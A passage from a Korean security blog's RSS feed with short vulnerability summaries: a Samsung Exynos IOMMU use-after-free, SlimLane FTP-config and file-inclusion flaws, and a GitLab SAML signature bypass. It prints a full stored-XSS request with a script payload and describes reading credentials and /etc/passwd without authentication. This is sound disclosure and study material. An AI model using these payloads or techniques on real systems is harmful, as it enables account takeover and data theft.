href="https://github.com/CruelKernel/samsung-exynos9820/blob/41aba77656e3377e8c55691b8b807d915e545343/drivers/iommu/exynos-iommu.c#L1545">sysmmu_map_pte</a> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xCC38;&#xC870;&#xB41C; Github &#xB9C1;&#xD06C;&#xB294; &#xC124;&#xBA85;&#xC744; &#xC704;&#xD55C; &#xC608;&#xC2DC;&#xC774;&#xBA70;, exploit &#xBC0F; &#xBD84;&#xC11D; &#xD658;&#xACBD;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sysmmu_map_pte</span><span class="hljs-params">(struct mm_struct *mm,</span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">pmd_t</span> *pmd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> end,</span></span><span class="hljs-function"><span class="hljs-params">struct exynos_iommu_domain *domain, <span class="hljs-keyword">sysmmu_iova_t</span> iova, <span class="hljs-keyword">int</span> prot)</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">pte_t</span> *pte;<span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<span class="hljs-keyword">spinlock_t</span> *ptl;<span class="hljs-keyword">bool</span> write = !!(prot &amp; IOMMU_WRITE);<span class="hljs-keyword">bool</span> pfnmap = !!(prot &amp; IOMMU_PFNMAP);  <span class="hljs-comment">// [1] If vma-&gt;vm_flags &amp; VM_PFNMAP is true, exynos_iovmm_map_userptr appends the IOMMU_PFNMAP flag to prot.</span><span class="hljs-keyword">bool</span> shareable = !!(prot &amp; IOMMU_CACHE);<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fault_flag = write ? FAULT_FLAG_WRITE : <span class="hljs-number">0</span>;<span class="hljs-keyword">sysmmu_pte_t</span> *ent, *ent_beg;pte = pte_alloc_map_lock(mm, pmd, addr, &amp;ptl);<span class="hljs-keyword">if</span> (!pte)<span class="hljs-keyword">return</span> -ENOMEM;ent = alloc_lv2entry_userptr(domain, iova);<span class="hljs-keyword">if</span> (IS_ERR(ent)) {ret = PTR_ERR(ent);<span class="hljs-keyword">goto</span> err;}ent_beg = ent;<span class="hljs-keyword">do</span> {<span class="hljs-keyword">if</span> (pte_none(*pte) || !pte_present(*pte) ||(write &amp;&amp; !pte_write(*pte))) {<span class="hljs-keyword">int</span> cnt = <span class="hljs-number">0</span>;<span class="hljs-keyword">int</span> maxcnt = <span class="hljs-number">1</span>;<span class="hljs-keyword">if</span> (pfnmap) {ret = -EFAULT;<span class="hljs-keyword">goto</span> err;}<span class="hljs-keyword">while</span> (cnt++ &lt; maxcnt) {spin_unlock(ptl);<span class="hljs-comment">/* find_vma() always successes */</span>ret = handle_mm_fault(find_vma(mm, addr),addr, fault_flag);spin_lock(ptl);<span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_ERROR) {ret = mm_fault_translate(ret);<span class="hljs-keyword">goto</span> err;} <span class="hljs-keyword">else</span> {ret = <span class="hljs-number">0</span>;}[...]}}BUG_ON(!lv2ent_fault(ent));*ent = mk_lv2ent_spage(pte_pfn(*pte) &lt;&lt; PAGE_SHIFT);<span class="hljs-keyword">if</span> (!pfnmap)get_page(pte_page(*pte));<span class="hljs-keyword">else</span>mk_lv2ent_pfnmap(ent);<span class="hljs-comment">// [2] For PFNMAP pages, the page reference count is not elevated.</span>[...]} <span class="hljs-keyword">while</span> (pte++, addr += PAGE_SIZE, addr != end);pgtable_flush(ent_beg, ent);err:pte_unmap_unlock(pte - <span class="hljs-number">1</span>, ptl);<span class="hljs-keyword">return</span> ret;}</code></pre><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; FNMAP &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; referece count&#xB97C; &#xC99D;&#xAC00;&#xC2DC;&#xD0A4;&#xC9C0; &#xC54A;&#xC73C;&#xBA70;, &#xD638;&#xCD9C; &#xCCB4;&#xC778; &#xC911;<a href="https://github.com/CruelKernel/samsung-exynos9820/blob/41aba77656e3377e8c55691b8b807d915e545343/drivers/iommu/exynos-iommu.c#L1713">exynos_iommu_unmap_userptr</a> &#xD568;&#xC218;&#xC5D0;&#xC11C; non-PFNMAP &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; reference count&#xB9CC; &#xAC10;&#xC18C;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. </p><p>&#xB530;&#xB77C;&#xC11C; PFNMAP &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0;, &#xC774;&#xB97C; I/O Virtual Memory&#xC5D0; &#xB9E4;&#xD551;&#xD55C; &#xB4A4; &#xCC38;&#xC870;&#xB41C; &#xC0C1;&#xD0DC;&#xC758; &#xD398;&#xC774;&#xC9C0;&#xB97C; <code>munmap</code>&#xC744; &#xD1B5;&#xD574; &#xD574;&#xC81C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9E4;&#xD551;&#xB418;&#xC5B4;&#xC788;&#xB294; I/O Virtual Memory&#xB294; &#xC5EC;&#xC804;&#xD788; &#xD574;&#xC81C;&#xB41C; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBBC0;&#xB85C; UAF&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; In-The-Wild&#xC5D0;&#xC11C; &#xC545;&#xC6A9;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xBA70;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xAD8C;&#xD55C;&#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC778; <code>cameraserver</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/samsung/">samsung</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/exynos/">exynos</category>
      
      <category domain="https://hackyboiz.github.io/tags/itw/">itw</category>
      
      <category domain="https://hackyboiz.github.io/tags/galaxy/">galaxy</category>
      
      
      <comments>https://hackyboiz.github.io/2024/10/27/l0ch/2024-10-27/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-48821/CVE-2024-48822/CVE-2024-48823: Automatic Systems Maintenance SlimLane에서 발생한 취약점</title>
      <link>https://hackyboiz.github.io/2024/10/23/pwndorei/2024-10-23/</link>
      <guid>https://hackyboiz.github.io/2024/10/23/pwndorei/2024-10-23/</guid>
      <pubDate>Wed, 23 Oct 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://daly.wtf/multiple-vulnerabilities-discovered-in-a</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://daly.wtf/multiple-vulnerabilities-discovered-in-automatic-systems-software/">https://daly.wtf/multiple-vulnerabilities-discovered-in-automatic-systems-software/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><em>Automatic Systems Maintenance - SlimLane - 29565_d74ecce0c1081d50546db573a499941b10799fb7</em></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Automatic Systems &#xC0AC;&#xC758; &#xBCF4;&#xC548;&#xAC8C;&#xC774;&#xD2B8; &#xC194;&#xB8E8;&#xC158;&#xC778; SlimLane&#xC5D0;&#xC11C; &#xB2E4;&#xC218;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; CVE-2024-48822&#xB294; ftp &#xC124;&#xC815;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xB294; <code>/FtpConfig.php</code>&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xBCC4;&#xB3C4;&#xC758; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D; &#xACFC;&#xC815; &#xC5C6;&#xC774; &#xD604;&#xC7AC; ftp &#xC124;&#xC815;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xB984;&#xACFC; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC838;&#xC624;&#xAC70;&#xB098; &#xC124;&#xC815;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/10/23/pwndorei/2024-10-23/image.png" alt="image.png"></p><p>CVE-2024-48821&#xC740; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; <code>/FtpConfig.php</code>&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC73C;&#xBA70; ftp &#xC124;&#xC815; &#xBCC0;&#xACBD;&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; &#xC785;&#xB825;&#xAC12;&#xC744; &#xC804;&#xD600; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; stored XSS &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xC784;&#xC758;&#xC758; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/FtpConfig.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: &lt;IP&gt;<span class="hljs-attribute">Content-Length</span>: 200<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.9<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36<span class="hljs-attribute">Connection</span>: keep-alive{&quot;fct&quot;:&quot;save_ftp_config&quot;,&quot;enabled&quot;:true,&quot;host&quot;:&quot;\&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;,&quot;user&quot;:&quot;\&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;,&quot;password&quot;:&quot;\&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;}12345678</code></pre><p><img src="/2024/10/23/pwndorei/2024-10-23/image%201.png" alt="image.png"></p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; CVE-2024-48823&#xC740; <code>/PassageAutoServer.php</code>&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; Local File Inclusion &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>file</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xD30C;&#xC77C;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB294; &#xB3D9;&#xC791;&#xC744; &#xD560; &#xB54C; <code>file</code>&#xC774; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC678;&#xBD80;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; <code>/etc/passwd</code>&#xC640; &#xAC19;&#xC740; &#xBBFC;&#xAC10;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC720;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/10/23/pwndorei/2024-10-23/image%202.png" alt="image.png"></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/LFI/">LFI</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/Automatic-Systems/">Automatic Systems</category>
      
      <category domain="https://hackyboiz.github.io/tags/XSS/">XSS</category>
      
      
      <comments>https://hackyboiz.github.io/2024/10/23/pwndorei/2024-10-23/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-45409: Gitlab SAML Authentication Bypass 취약점</title>
      <link>https://hackyboiz.github.io/2024/10/19/mungsul/2024-10-19/</link>
      <guid>https://hackyboiz.github.io/2024/10/19/mungsul/2024-10-19/</guid>
      <pubDate>Sat, 19 Oct 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.projectdiscovery.io/ruby-saml-gitlab-auth-by</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.projectdiscovery.io/ruby-saml-gitlab-auth-bypass/">https://blog.projectdiscovery.io/ruby-saml-gitlab-auth-bypass/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Gitlab CE/EE<ul><li>&lt; 16.11.10</li><li>17.0.0 &lt; 17.0.8</li><li>17.0.0 &lt; 17.1.8</li><li>17.0.0 &lt; 17.2.7</li><li>17.0.0 &lt; 17.3.3</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Gitlab &#xC758; SAML &#xC778;&#xC99D; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xAC80;&#xC99D; &#xBBF8;&#xD761;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. SAML &#xC778;&#xC99D;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB41C; Gitlab &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC758; &#xACBD;&#xC6B0; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xACC4;&#xC815;&#xC774; &#xD0C8;&#xCDE8;&#xB2F9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>SAML &#xC778;&#xC99D;</strong></p><p>SAML (Security Assertion Markup Language) &#xB294; &#xB110;&#xB9AC; &#xC54C;&#xB824;&#xC9C4; &#xC778;&#xC99D; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; Idp (Identifier Provider) &#xC5D0;&#xC11C; SP (Service Provider) &#xB85C; &#xAD8C;&#xD55C; &#xC778;&#xC99D; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC744; &#xC804;&#xB2EC;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD45C;&#xC900; &#xBC29;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;. </p><p>Gitlab &#xACFC; &#xAC19;&#xC740; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xB2E4;&#xBCF4;&#xBA74; Google &#xB85C; &#xB85C;&#xADF8;&#xC778;&#xD558;&#xAE30;&#xC640; &#xAC19;&#xC740; &#xB2E4;&#xB978; &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xB85C;&#xADF8;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC885;&#xC885; &#xBCF4;&#xC168;&#xC744;&#xD150;&#xB370;&#xC694;. &#xC774;&#xB7F4; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBC29;&#xBC95; &#xC911; &#xD558;&#xB098;&#xAC00; SAML &#xC778;&#xC99D;&#xC774;&#xBA70; oauth &#xC640; &#xB354;&#xBD88;&#xC5B4; SSO &#xB97C; &#xAD6C;&#xD604;&#xD560; &#xB54C; &#xC774;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>Gitlab &#xC5D0;&#xC11C; Google &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xB85C;&#xADF8;&#xC778; &#xBC84;&#xD2BC;&#xC744; &#xB20C;&#xB800;&#xB2E4;&#xACE0; &#xD55C;&#xB2E4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCE69;&#xB2C8;&#xB2E4;.</p><ol><li>Google &#xB85C; &#xB85C;&#xADF8;&#xC778; &#xD569;&#xB2C8;&#xB2E4;.</li><li>Google &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xB85C;&#xADF8;&#xC778;&#xB41C; &#xACC4;&#xC815;&#xC5D0; &#xB300;&#xD574; SAML Response &#xB77C;&#xB294; &#xAC12;&#xC744; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. (&#xC774; &#xB54C;, Google &#xC774; IdP &#xAC00; &#xB429;&#xB2C8;&#xB2E4;.)</li><li>&#xC0AC;&#xC6A9;&#xC790;&#xB294; Google &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xBC1B;&#xC740; SAML Response &#xB97C; Gitlab &#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. (Gitlab &#xC774; Service Provider &#xC785;&#xB2C8;&#xB2E4;.)</li><li>Gitlab &#xC740; &#xC804;&#xB2EC;&#xBC1B;&#xC740; SAML Response &#xB97C; &#xAC80;&#xC99D;&#xD558;&#xACE0; &#xC774;&#xC0C1;&#xC774; &#xC5C6;&#xB2E4;&#xBA74; &#xD574;&#xB2F9; &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</li></ol><p>SAML Response &#xAC80;&#xC99D;&#xC740; &#xC5B4;&#xB5BB;&#xAC8C; &#xC774;&#xB904;&#xC9C8;&#xAE4C;&#xC694;? &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; SAML Response &#xC5D0;&#xB294; Assertion &#xC774;&#xB77C;&#xB294; &#xC694;&#xC18C;&#xAC00; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;. </p><p>Assertion &#xC5D0;&#xB294; &#xB85C;&#xADF8;&#xC778; &#xB300;&#xC0C1; &#xACC4;&#xC815;, &#xACC4;&#xC815; &#xAD8C;&#xD55C; &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xAC00; &#xAE30;&#xC7AC;&#xB429;&#xB2C8;&#xB2E4;. Assertion &#xC758; &#xB0B4;&#xC6A9;&#xC774; &#xBCC0;&#xACBD;&#xB418;&#xBA74; &#xC548;&#xB418;&#xAE30;&#xC5D0; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xC704;&#xD574; Signature&#xC758; SignedInfo &#xBE14;&#xB85D;&#xC5D0;&#xC11C; Assertion &#xC758; digest(hash) &#xC640; &#xC11C;&#xBA85;&#xAC12;&#xC744; &#xAE30;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC124;&#xBA85;&#xC5D0; &#xB530;&#xB978; XML &#xC608;&#xC2DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">&lt;Assertion ID=<span class="hljs-string">&quot;_abc123&quot;</span>&gt;  &lt;Signature&gt;    &lt;SignedInfo&gt;      &lt;Reference URI=<span class="hljs-string">&quot;#_abc123&quot;</span>&gt;        &lt;DigestMethod Algorithm=<span class="hljs-string">&quot;http://www.w3.org/2001/04/xmlenc#sha256&quot;</span> /&gt;        &lt;DigestValue&gt;abc123DigestValue&lt;/DigestValue&gt;      &lt;/Reference&gt;    &lt;/SignedInfo&gt;    &lt;SignatureValue&gt;SignedWithPrivateKey&lt;/SignatureValue&gt;  &lt;/Signature&gt;    &lt;!-- Assertion contents --&gt;&lt;/Assertion&gt;</code></pre><p>JWT &#xD1A0;&#xD070;&#xC5D0;&#xB3C4; &#xB85C;&#xADF8;&#xC778;&#xD560; &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xBCF4;&#xC640; Signature &#xAC00; &#xBD99;&#xB294;&#xB370;, &#xC774;&#xC640; &#xC720;&#xC0AC;&#xD55C; &#xAD6C;&#xC870;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>Ruby-SAML &#xC6B0;&#xD68C;</strong></p><p>Gitlab &#xC740; SAML &#xC778;&#xC99D;&#xC744; &#xC704;&#xD574; Ruby-SAML, OmniAuth-SAML &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9; &#xD569;&#xB2C8;&#xB2E4;. Ruby-SAML &#xC5D0;&#xC11C;&#xB294; XPath &#xB97C; &#xD1B5;&#xD574; XML &#xC694;&#xC18C;&#xB4E4;&#xC744; &#xCC38;&#xC870;&#xD558;&#xAC8C;&#xB054; &#xAD6C;&#xD604;&#xC774; &#xB3FC;&#xC788;&#xB294;&#xB370;&#xC694;. XPath &#xB300;&#xB7B5;&#xC801;&#xC778; &#xBB38;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>/ - &#xB8E8;&#xD2B8; &#xB178;&#xB4DC;&#xB85C;&#xBD80;&#xD130; &#xC808;&#xB300;&#xACBD;&#xB85C; &#xCC38;&#xC870;, /samp:Response &#xCC98;&#xB7FC; &#xC4F8; &#xACBD;&#xC6B0; <code>&lt;samlp:Response&gt;</code> &#xC5D8;&#xB9AC;&#xBA3C;&#xD2B8;&#xB97C; &#xC758;&#xBBF8;&#xD568;. /samlp:Response/saml:Issuer &#xCC98;&#xB7FC; &#xC4F0;&#xBA74; <code>&lt;samlp:Response&gt;</code> &#xC544;&#xB798;&#xC758; <code>&lt;saml:Issuer&gt;</code> &#xB97C; &#xC758;&#xBBF8;&#xD568;.</li><li>./ - &#xD604;&#xC7AC; &#xB178;&#xB4DC;&#xB85C;&#xBD80;&#xD130; &#xC0C1;&#xB300;&#xACBD;&#xB85C; &#xCC38;&#xC870;</li><li>// - xml &#xBB38;&#xC11C; &#xB0B4; &#xC804;&#xCCB4; &#xD0D0;&#xC0C9;.</li></ul><p>&#xC5EC;&#xAE30;&#xAE4C;&#xC9C0; &#xBD24;&#xC744; &#xB54C;, &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC65C; &#xBC1C;&#xC0DD;&#xD588;&#xB294;&#xC9C0; &#xAC10;&#xC774; &#xC624;&#xC2DC;&#xB098;&#xC694;? Ruby-SAML &#xC5D0;&#xC11C;&#xB294; Assertion &#xC758; hash &#xC778; DigestValue &#xB97C; &#xAC16;&#xACE0; &#xC624;&#xAE30; &#xC704;&#xD574; // &#xBB38;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>// &#xBB38;&#xBC95;&#xC740; &#xBB38;&#xC11C; &#xC804;&#xCCB4;&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; DigestValue &#xAC00; SignedInfo &#xC548;&#xC5D0; &#xC5C6;&#xC5B4;&#xB3C4; &#xAC80;&#xC0C9;&#xC774; &#xAC00;&#xB2A5;&#xD588;&#xC5C8;&#xC8E0;. &#xADF8;&#xB807;&#xAE30;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xB294; DigestValue &#xB97C; &#xBB38;&#xC11C; &#xB0B4; &#xC544;&#xBB34; &#xACF3;&#xC5D0; &#xBC30;&#xCE58;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">encoded_digest_value = REXML::XPath.first(  ref,  <span class="hljs-string">&quot;//ds:DigestValue&quot;</span>,  { <span class="hljs-string">&quot;ds&quot;</span> =&gt; DSIG })</code></pre><p><strong>&#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xC6B0;&#xD68C;</strong></p><p>&#xCDE8;&#xC57D;&#xC810; &#xD2B8;&#xB9AC;&#xAC70;&#xB97C; &#xC704;&#xD574; &#xC9DA;&#xC5B4;&#xC57C;&#xD560; &#xC0AC;&#xD56D;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Assertion &#xC5D0;&#xB294; &#xB85C;&#xADF8;&#xC778;&#xD560; ID &#xC815;&#xBCF4;&#xAC00; &#xAE30;&#xC7AC;&#xB41C;&#xB2E4; &#x2192; Assertion &#xBCC0;&#xC870; &#xC2DC; &#xC6D0;&#xD558;&#xB294; &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xB85C;&#xADF8;&#xC778; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;.</li><li>Assertion &#xBB34;&#xACB0;&#xC131;&#xC740; hash &#xC640; &#xC11C;&#xBA85;&#xC73C;&#xB85C; &#xD655;&#xBCF4;&#xB418;&#xB294;&#xB370;, &#xC774; &#xAC12;&#xB4E4;&#xC740; SignedInfo &#xC5D0; &#xC800;&#xC7A5;&#xB41C;&#xB2E4;.</li></ul><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74; Assertion &#xC744; &#xBCC0;&#xC870;&#xD558;&#xACE0; &#xBCC0;&#xC870;&#xB41C; Assertion &#xC758; DigestValue &#xB97C; SignedInfo &#xC774;&#xC804;&#xC5D0; &#xBC30;&#xCE58;&#xC2DC;&#xD0A8;&#xB2E4;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;&#xC694;?</p><p>DigestValue &#xAC00; // &#xB85C; &#xC778;&#xD574; &#xC55E; &#xCABD;&#xC5D0; &#xBC30;&#xCE58;&#xAC00; &#xAC00;&#xB2A5;&#xD55C;&#xB2E4;&#xACE0; &#xD574;&#xB3C4; &#xBCC0;&#xACBD;&#xB41C; hash &#xAC00; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC744; &#xD1B5;&#xACFC;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;?</p><p>&#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC5D0;&#xB294; // &#xB85C; &#xAC80;&#xC0C9;&#xB41C; DigestValue &#xAC00; &#xC544;&#xB2CC;, &#xC6D0;&#xBCF8; SignedInfo &#xB0B4; &#xC874;&#xC7AC;&#xD558;&#xB294; DigestValue &#xC640; &#xC11C;&#xBA85;&#xC744; &#xAC80;&#xC0AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, SignedInfo &#xB294; &#xADF8;&#xB300;&#xB85C; &#xB450;&#xACE0; &#xBCC0;&#xC870;&#xB41C; DigestValue &#xB9CC; &#xC55E; &#xCABD;&#xC5D0; &#xBC30;&#xCE58;&#xD55C;&#xB2E4;&#xBA74; &#xC778;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; 